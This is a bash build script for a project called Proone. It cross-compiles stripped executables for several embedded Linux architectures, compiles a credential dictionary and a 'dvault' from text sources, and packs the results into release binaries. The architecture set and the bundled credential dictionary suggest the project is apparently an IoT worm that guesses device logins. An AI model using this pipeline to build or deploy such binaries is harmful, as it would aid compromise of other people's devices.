#!/bin/bash
## \file
# \brief Build all target arches specified and native tools necessary for
#	fabrication of executables. You'll use this script a lot!
# \note xcomp is required for this script to function.
set -e # die on error

##
# \note \c ARCH_ARR, \c TOOLCHAIN_ARR and \c HOST_ARR form tuples of target
# arches. \c ARCH_ARR lists the name of the arches to be used for the output
# files(suffix). \c TOOLCHAIN_ARR lists the \b xcomp targets for each arch.
# \c HOST_ARR is the list of the toolchain prefixes.
ARCH_ARR=(
#	"aarch64"
	"armv4t"
#	"armv7"
	"i686"
#	"x86_64"
	"m68k"
	"mips"
	"mpsl"
	"ppc"
	"sh4"
)
TOOLCHAIN_ARR=(
#	"aarch64"
	"armv4t"
#	"armv7"
	"i686"
#	"x86_64"
	"m68k"
	"mips"
	"mpsl"
	"ppc"
	"sh4"
)
HOST_ARR=(
#	"aarch64-linux"
	"arm-linux"
#	"arm-linux"
	"i686-linux"
#	"x86_64-linux"
	"m68k-linux"
	"mips-linux"
	"mipsel-linux"
	"powerpc-linux"
	"sh4-linux"
)
# Length check. All three arrays must have the same number of elements.
ARR_SIZE="${#ARCH_ARR[@]}"
if [ $ARR_SIZE -ne "${#TOOLCHAIN_ARR[@]}" ] ||
	[ $ARR_SIZE -ne "${#HOST_ARR[@]}" ];
then
	echo "Config error: arrays" >&2
	exit 2
fi

# The root prefix. Note that the script is run from the project root directory.
PROONE_PREFIX="builds"
# The prefix to debug symbol files
PROONE_DEBUG_SYM_DIR="$PROONE_PREFIX/debug"
# The prefix to Proone executables
PROONE_EXEC_DIR="$PROONE_PREFIX/proone.bin"
# The prefix to native tools
PROONE_TOOLS_DIR="$PROONE_PREFIX/tools"
# The prefix to miscellaneous executables for target
PROONE_MISC_BIN_DIR="$PROONE_PREFIX/misc"
# The name of the directory for release build Proone executables
PROONE_REL_DIR="$PROONE_PREFIX/proone"
# The prefix to debug symbol files
export PROONE_DEBUG_SYM_PREFIX="$PROONE_DEBUG_SYM_DIR/"
# The prefix to all stripped executables
export PROONE_EXEC_PREFIX="$PROONE_EXEC_DIR/stripped"
# The prefix to the original Proone executable output by the compiler
export PROONE_ENTIRE_PREFIX="$PROONE_EXEC_DIR/entire"
# The prefix to the disassembler output
export PROONE_ASM_PREFIX="$PROONE_EXEC_DIR/asm"
# The prefix to the readelf output
export PROONE_READELF_PREFIX="$PROONE_EXEC_DIR/readelf"
# The prefix to the miscellaneous executables
export PROONE_MISC_BIN_PREFIX="$PROONE_MISC_BIN_DIR/"
# The prefix to the names of the release build Proon executables
PROONE_REL_PREFIX="$PROONE_REL_DIR/proone"
# The path to the cred dict binary file
PROONE_CDICT="$PROONE_PREFIX/cred_dict.bin"
# The path to the dvault binary file
PROONE_DVAULT="$PROONE_PREFIX/dvault.bin"
# The array of the native tools
PROONE_TOOLS="
	proone-pack
	proone-list-arch
	proone-mkcdict
	proone-mkdvault
	proone-ipaddr-arr
"

################################################################################

# Drop the root directory and set up the skeleton
rm -rf "$PROONE_PREFIX"
mkdir\
	"$PROONE_PREFIX"\
	"$PROONE_DEBUG_SYM_DIR"\
	"$PROONE_EXEC_DIR"\
	"$PROONE_TOOLS_DIR"\
	"$PROONE_MISC_BIN_DIR"\
	"$PROONE_REL_DIR"
# Ignore the clean up error because the project may not have been configured
set +e
make distclean
set -e

# Build native tools
./configure $PROONE_AM_CONF
make -j$(nproc) -C src $PROONE_TOOLS
for t in $PROONE_TOOLS; do
	cp -a "src/$t" "$PROONE_TOOLS_DIR"
done
# Copy the test suites as well
cp -a "./src/run-tests.sh" "./src/testlist" "$PROONE_MISC_BIN_DIR"
make distclean

# Generate dvault and cred dict binary
"$PROONE_TOOLS_DIR/proone-mkcdict"\
	"./src/proone_conf/cred_dict.txt"\
	"$PROONE_CDICT"
"$PROONE_TOOLS_DIR/proone-mkdvault" "$PROONE_CDICT" > "$PROONE_DVAULT"
DVAULT_SIZE=$(stat -c "%s" "$PROONE_DVAULT")

# Build all targets
for (( i = 0; i < ARR_SIZE; i += 1 )); do
	PROONE_BIN_OS="linux"\
	PROONE_HOST="${HOST_ARR[$i]}"\
	PROONE_BIN_ARCH="${ARCH_ARR[$i]}"\
	xcomp linux-app\
		"${TOOLCHAIN_ARR[$i]}"\
		"scripts/build-arch.sh"
done

# Do pack
"$PROONE_TOOLS_DIR/proone-pack"\
	"$PROONE_REL_PREFIX"\
	"$PROONE_DVAULT"\
	"$PROONE_EXEC_PREFIX".*
